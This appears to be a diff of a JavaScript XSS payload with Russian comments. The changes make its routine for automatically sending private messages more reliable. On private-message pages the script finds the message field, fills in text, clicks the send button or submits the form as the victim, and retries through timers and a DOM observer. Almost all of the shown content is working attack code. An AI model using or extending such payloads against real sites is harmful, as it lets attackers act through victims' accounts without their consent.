@@ -41,33 +41,131 @@
   
   // 1. Автоматическая отправка личного сообщения
   function sendPrivateMessage() {
-    // Поиск формы или поля для отправки сообщения
-    var messageInput = document.querySelector('textarea[name*="message"], input[name*="message"], textarea[placeholder*="сообщени"], textarea[placeholder*="message"]');
+    console.log('sendPrivateMessage вызвана');
+    
+    // Множественные способы поиска поля для ввода сообщения
+    var messageInput = document.querySelector('textarea[name="message"]') ||
+                      document.querySelector('textarea[name*="message"]') ||
+                      document.querySelector('input[name*="message"]') ||
+                      document.querySelector('textarea[placeholder*="сообщени"]') ||
+                      document.querySelector('textarea[placeholder*="Введите сообщение"]') ||
+                      document.querySelector('textarea[placeholder*="message"]') ||
+                      document.querySelector('textarea') ||
+                      document.querySelector('input[type="text"]');
+    
+    console.log('Найдено поле для сообщения:', messageInput);
     
     if (messageInput) {
-      messageInput.value = 'Автоматически отправленное сообщение через XSS';
-      messageInput.dispatchEvent(new Event('input', { bubbles: true }));
+      // Заполняем поле текстом
+      var messageText = 'Автоматически отправленное сообщение через XSS';
+      messageInput.value = messageText;
+      messageInput.innerHTML = messageText; // Для contenteditable элементов
       
-      // Попытка отправки
+      // Вызываем события для триггера валидации и обновления состояния
+      messageInput.dispatchEvent(new Event('input', { bubbles: true }));
+      messageInput.dispatchEvent(new Event('change', { bubbles: true }));
+      messageInput.dispatchEvent(new Event('keyup', { bubbles: true }));
+      
+      // Также пытаемся установить через свойство напрямую
+      if (messageInput.setAttribute) {
+        messageInput.setAttribute('value', messageText);
+      }
+      
+      logAction('message_input_filled', messageText);
+      
+      // Ищем кнопку "Отправить" разными способами
       setTimeout(function() {
-        // Ищем кнопку отправки
-        var sendButton = document.querySelector('button[type="submit"]') || 
-                        findButtonByText('Отправить') || 
-                        findButtonByText('Send') ||
-                        findButtonByText('отправить');
+        console.log('Ищем кнопку отправки...');
         
-        if (sendButton) {
-          sendButton.click();
-          logAction('send_message', 'success');
-        } else {
-          // Попытка найти форму и отправить
-          var form = messageInput.closest('form');
-          if (form) {
-            form.submit();
-            logAction('send_message', 'form_submitted');
+        var sendButton = findButtonByText('Отправить') ||
+                        findButtonByText('отправить') ||
+                        findButtonByText('Send') ||
+                        document.querySelector('button[type="submit"]') ||
+                        document.querySelector('button[onclick*="submit"]') ||
+                        null;
+        
+        // Если не нашли, перебираем все кнопки и ссылки
+        if (!sendButton) {
+          var allButtons = document.querySelectorAll('button, a[role="button"], a[onclick]');
+          for (var i = 0; i < allButtons.length; i++) {
+            var btn = allButtons[i];
+            var btnText = (btn.textContent || btn.innerText || btn.value || '').trim();
+            if (btnText === 'Отправить' || btnText.toLowerCase() === 'отправить' || 
+                btnText === 'Send' || btnText.toLowerCase() === 'send') {
+              sendButton = btn;
+              break;
+            }
           }
         }
-      }, 500);
+        
+        // Также ищем кнопку внутри ссылки (как в HTML из изображения)
+        if (!sendButton) {
+          var linkWithButton = document.querySelector('a[onclick*="submit"] button');
+          if (linkWithButton) {
+            sendButton = linkWithButton.parentElement; // Используем родительскую ссылку
+          }
+        }
+        
+        console.log('Найдена кнопка отправки:', sendButton);
+        
+        if (sendButton) {
+          // Пробуем разные способы клика
+          try {
+            sendButton.click();
+            logAction('send_button_clicked', 'success');
+            console.log('Кнопка отправки нажата через click()');
+          } catch(e) {
+            console.log('Ошибка при click(), пробуем через событие:', e);
+            // Если обычный клик не работает, используем dispatchEvent
+            try {
+              var clickEvent = new MouseEvent('click', {
+                bubbles: true,
+                cancelable: true,
+                view: window,
+                button: 0
+              });
+              sendButton.dispatchEvent(clickEvent);
+              logAction('send_button_clicked', 'via_event');
+              console.log('Кнопка отправки нажата через dispatchEvent');
+            } catch(e2) {
+              console.log('Ошибка при dispatchEvent:', e2);
+            }
+          }
+        } else {
+          console.log('Кнопка не найдена, пробуем через форму');
+          // Альтернативный поиск - ищем форму и отправляем
+          var form = messageInput.closest('form');
+          if (form) {
+            console.log('Найдена форма, отправляем через submit()');
+            form.submit();
+            logAction('send_form_submitted', 'success');
+          } else {
+            // Ищем форму по action
+            var forms = document.querySelectorAll('form');
+            for (var i = 0; i < forms.length; i++) {
+              var f = forms[i];
+              if (f.action && f.action.includes('/mail/') && f.action.includes('/send')) {
+                console.log('Найдена форма для отправки сообщений, отправляем');
+                f.submit();
+                logAction('send_form_submitted', 'via_action_match');
+                break;
+              }
+            }
+          }
+        }
+      }, 1000); // Увеличил задержку до 1 секунды
+      
+      return true;
+    } else {
+      console.log('Поле для сообщения не найдено!');
+      logAction('send_message_failed', 'input_not_found');
+      
+      // Повторная попытка через 2 секунды (на случай динамической загрузки)
+      setTimeout(function() {
+        sendPrivateMessage();
+      }, 2000);
+      
+      return false;
     }
   }
   
@@ -345,10 +443,36 @@
   
   // Если это страница личных сообщений
   if (currentPath.includes('/mail/') || currentPath.includes('/message/') || currentPath.includes('/private/')) {
+    console.log('Обнаружена страница личных сообщений, запускаю sendPrivateMessage');
+    
+    // Пробуем несколько раз с разными задержками (на случай динамической загрузки)
     setTimeout(function() {
-      // Автоматически отправляем сообщение
       sendPrivateMessage();
-    }, 2000); // Ждем 2 секунды после загрузки
+    }, 1000);
+    
+    setTimeout(function() {
+      sendPrivateMessage();
+    }, 3000);
+    
+    setTimeout(function() {
+      sendPrivateMessage();
+    }, 5000);
+    
+    // Также следим за изменениями DOM
+    var observer = new MutationObserver(function(mutations) {
+      var messageInput = document.querySelector('textarea[name="message"], textarea[placeholder*="сообщени"]');
+      if (messageInput) {
+        observer.disconnect();
+        setTimeout(function() {
+          sendPrivateMessage();
+        }, 500);
+      }
+    });
+    
+    observer.observe(document.body, {
+      childList: true,
+      subtree: true
+    });
   }
   
   // Если это страница настроек/профиля
